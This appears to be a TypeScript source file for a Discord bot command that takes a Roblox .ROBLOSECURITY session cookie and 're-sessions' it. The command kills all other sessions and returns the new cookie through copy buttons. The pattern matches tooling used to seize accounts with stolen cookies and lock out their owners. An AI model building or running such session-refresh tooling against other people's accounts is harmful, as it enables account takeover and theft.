import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
} from 'discord.js';
import { resetCookie, type RefreshResult } from '../roblox';

const cookieStore = new Map<string, { cookie: string; timestamp: number }>();

setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of cookieStore) {
    if (now - entry.timestamp > 10 * 60 * 1000) cookieStore.delete(key);
  }
}, 60_000);

export function storeAndBuildRow(cookie: string): ActionRowBuilder<ButtonBuilder> {
  const id = Math.random().toString(36).substring(2, 10);
  cookieStore.set(id, { cookie, timestamp: Date.now() });
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId(`cookie_mobile_${id}`).setLabel('📱 Mobile Copy').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`cookie_pc_${id}`).setLabel('💻 PC Copy').setStyle(ButtonStyle.Secondary),
  );
}

export const refreshCookieCommand = new SlashCommandBuilder()
  .setName('rcookie')
  .setDescription('Re-session a Roblox cookie (kills all other sessions)')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie').setDescription('The .ROBLOSECURITY cookie (full or bare CAEQ... value)').setRequired(true),
  );

export async function handleRefreshCookie(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ ephemeral: true });

  const cookie = interaction.options.getString('cookie', true).trim();

  let result: RefreshResult | null = null;
  for (let attempt = 1; attempt <= 2; attempt++) {
    result = await resetCookie(cookie);
    if (result.newCookie) break;
  }

  if (!result?.newCookie) {
    const status = result?.status ?? 'unknown';
    const debugBlock = result?.debug ? `\n\`\`\`\n${result.debug}\n\`\`\`` : '';
    await interaction.editReply(`❌ **Re-session failed** — \`${status}\`${debugBlock}`);
    return;
  }

  const row = storeAndBuildRow(result.newCookie);
  await interaction.editReply({
    content: '✅ **Cookie re-sessioned!** All other sessions have been killed. Use the buttons to copy the new cookie.',
    components: [row],
  });
}

export async function handleButtonInteraction(interaction: MessageComponentInteraction): Promise<void> {
  const { customId } = interaction;
  const mobileMatch = customId.match(/^cookie_mobile_(.+)$/);
  const pcMatch = customId.match(/^cookie_pc_(.+)$/);
  const match = mobileMatch ?? pcMatch;
  if (!match) return;

  const entry = cookieStore.get(match[1]);
  if (!entry) {
    await interaction.reply({ content: '❌ Cookie expired — run the command again.', ephemeral: true });
    return;
  }

  if (mobileMatch) {
    await interaction.reply({ content: `\`${entry.cookie}\``, ephemeral: true });
  } else {
    await interaction.reply({ content: `\`\`\`\n${entry.cookie}\n\`\`\``, ephemeral: true });
  }
}
